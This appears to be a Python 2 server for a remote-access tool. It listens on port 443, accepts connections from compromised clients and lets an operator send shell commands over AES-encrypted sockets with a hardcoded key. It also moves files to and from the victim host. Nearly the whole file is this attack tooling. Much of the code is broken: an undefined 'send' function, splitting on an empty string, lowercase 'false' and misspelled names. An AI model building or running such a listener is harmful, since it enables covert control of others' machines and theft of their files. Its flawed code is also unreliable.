from Crypto.Cipher import AES
import socket
import base64
import time 
import os
import sys,select

# the block size for the cipher object; must be 16 per FIPS-197
BLOCK_SIZE = 16

# one-liners to encrypt/encode and decrypt/decode a string
# encrypt with AES, encode with base64
EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)

# generate a random secret key
secret = "HUISA78sa9y&9syYSsJHsjkdjklfs9aR"

# create a cipher object using the random secret
cipher = AES.new(secret)

# clear function
########################################
# Windows ...............> cls
# linux   ...............> clear
clear = lambda: os.system('clear')
# encode a string
# encoded = EncodeAES(cipher, 'password')
# print 'Encrypted string:', encoded

# decode the encoded string
# decoded = DecodeAES(cipher, encoded)
# print 'Decrypted string:', decoded

# socket
c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
c.bind(('0.0.0.0',443))
c.listen(128)


# listening varibles
active = False
clients = [] 
socks = []
interval = 0.8 

# Functions
###########

# send data
def Send(sock, cmd, end="EOFEOFEOFEOFEOFX"):
	sock.sendall(EncodeAES(cipher, cmd + end))
	
# receive data
def Receive(sock, end="EOFEOFEOFEOFEOFX"):
	data = ""
	l = sock.recv(1024)
	while(l):
		decrypted = DecodeAES(cipher, l)
		data += decrypted
		if data.endswith(end) == True:
			break
		else:
			l = sock.recv(1024)
	return data[:-len(end)]

# download file
def downlaod(sock, remote_filename, local_filename=None):
	# check if file exists
	if not local_filename:
		local_filename = remote_filename
	try:
		f = open(local_filename,'wb')
	except IOError:
		print "Error opening file.\n"
		send(sock, "cd .")
		return
	# start transfer
	send(sock, "download " + remote_filename)
	print " Downlaoding: " + remote_filename + ">" + local_filename
	time.sleep(interval)
	fileData = Receive(sock)
	print "> File size: " + str(len(fileData))
	time.sleep(interval)
	f.write(fileData)
	time.sleep(interval)
	f.close()
	
def upload(sock, local_filename, remote_filename=None):
	# check if file exists
	if not local_filename:
		local_filename = remote_filename
	try:
		g = open(local_filename,'rb')
	except IOError:
		print "Error opening file.\n"
		send(sock, "cd .")
		return
	# start transfer
	send(sock, "upload " + remote_filename)
	print " uploading: " + remote_filename + ">" + local_filename
	while True:
		fileData = g.read()
		if not fileData: break
		send(sock, fileData, "")
		print " File size: " + str(len(fileData))
	g.close()
	time.sleep(interval)
	send(sock, "")
	time.sleep(interval)
	
# refresh clients
def refresh():
	clear()
	print "\nListening for clients..\n"
	if len(clients) > 0:
		for j in range(0,len(clients)):
			print'[' + str((j+1)) + '] Client: ' + clients[j] + '\n'
			
	else:
		print"...\n"
	# print exit option
	print "...\n"
	print "[0] Exit \n"
	print "\nPress Ctrl+C to interact with client "
	
			
# welcome message
# print '\nListening for clients...\n'

# main loop
while True:
	refresh()
	# listen for clients
	try:
		# set timeout
		c.settimeout(10)
		
		# accept connection
		try:
			s,a = c.accept()
		except socket.timeout:
			continue
		
		# add socket
		if (s):
			s.settimeout(None)
			socks +=[s]
			clients += [str(a)]
		# display clients
		refresh()
		# sleep
		time.sleep(interval)
	except KeyboardInterrupt:
		# display clients
		refresh()

		# accept selection --- int, 0/1-128
		activate = input("\nEnter option: ")
		# exit
		if activate == 0:
			print '\nExiting..\n'
			for j in xrange(0,len(socks)):
				socks[j].close()
			sys.exit()
		# subtract 1 (array starts at 0)
		activate -= 1

		# clear screen
		clear()

		# create a cipher object using the random secret
		cipher = AES.new(secret)
		print '\nActivating client: ' + clients[activate] + '\n'
		active = True
		print "here"
		socks[activate].send('Activate')

'''
		# disable timeout
		s.settimeout(none)

		# add socket to list
		socks += [s]
			
		# add clients to list
		clients += [str(a)]
			
		# display clients
		clear()
		print '\nListening for clients...\n'
	if len(clients) > 0 :
		for j in range(0, len(clients)):
			print '[' + str((j+1))+'] clients: ' + clients[j] + '\n'
		print "Press Ctrl+C to interact with client,"
	time.sleep(interval)
		
	except KeyboardInterrupt:
		clear()
		print '\nListening for clients...\n'
		if len(clients) > 0:
			for j in range(0, len(clients)):
				print '[' + str((j+1)) + '] Client: ' + clients[j] + '\n'
			print "...\n"
			print "[0] Exit \n"
		activate = input("\nEnter option: ")
		if activate == 0:
			print '\nExiting...\n'
			sys.exit()
		activate -= 1
		clear()
		print '\nActivating client: ' + clients[activate] + '\n'
		active = True
		encrypted = EncodeAES(cipher, 'Activate')
		socks[activate].send(encrypted)
'''
	
while active:
		try:
			# receive encrypted data
			data = Receive(socks[activate]) # .recv(1024)
			# decrypt data
			decrypted = DecodeAES(cipher, data)
			# check for the end of file 
			if decrypted.endswith("EOFEOFEOFEOFEOFX") == True :
				# print command
				print decrypted[-9:]
			else :
				# print command
				print decrypted
			# get next command
			nextcmd = raw_input("[shell]: ")
			# encrypt that $#!^
			encrypted = EncodeAES(cipher, nextcmd)
			# send that $hit
			socks[activate].send(encrypted)
			if nextcmd.startswith('Exit') == True : 
				active = false
				print 'Press Ctrl+C to return to listener mode ...'
		except:
			print '\nClient disconnected... ' + clients[activate]
			# delete client
			socks[activate].close()
			time.sleep(0.8)
			socks.remove(socks[activate])
			refresh()
			active = false
			break
		# exit client session 
		if data == 'quitted':
			# print message 
			print "Exit.\n"
			# remove from arrays
			socks[activate].close()
			socks.remove(socks[activate])
			clients.remove(clients[activate])
			# sleeo and refresh
			time.sleep
			refresh()
			active = false
			break
		elif data != '':
			# get next command
			sys.stdout.write(data)
			nextcmd = raw_input()

		# download 
		if nextcmd.startswith('download') == True :
			if len(nextcmd.split('')) > 2:
				upload(socks[activate],nextcmd.split(''),nextcmd.split('')[2])
			else:
				downlaod(socks[activate],nextcmd.split('')[1])
		# upload 
		if nextcmd.startswith('upload') == True :
			if len(nextcmd.split('')) > 2:
				upload(socks[activate],nextcmd.split(''),nextcmd.split('')[2])
			else:
				downlaod(socks[activate],nextcmd.split('')[1])

		# normal command 
		elif nextcmd != '':
			send(socks[activate],nextcmd)

			
'''
		# downlaod file
		if nextcmd.startswith('download') == True :
			# set file name 
			downfile = nextcmd[9:]
			# open file
			f = open( downfile, 'wb')
			print 'Downlaoding: ' + downfile		
			# begin downloading
			while True:
				l = socks[activate].recv(1024)
				while (l):
					if l.endswith("EOFEOFEOFEOFEOFX"):
						u = l [:-16]
						f.write(u)		
						break
					else:
						f.write(l)
						l = socks[activate].recv(1024)
						
				break			
			# close file
			f.close()	
		elif nextcmd.startswith('upload') == True :
			
			# file name 
			upFile = nextcmd[7:]
			
			# open file 
			g = open(upFile, 'rb')
			print 'uploading: ' + upFile
			
			# uploading
			while 1:
				fileData = g.read()
				if not fileData: break
				# begin sending file 
				s.sendall(fileData)
			g.close()
			time.sleep(0.8)
			
			# let client Know we're done
			s.sendall('EOFEOFEOFEOFEOFX')
			time.sleep(0.8)
			
		# else Just print
		else:
			print decrypted
'''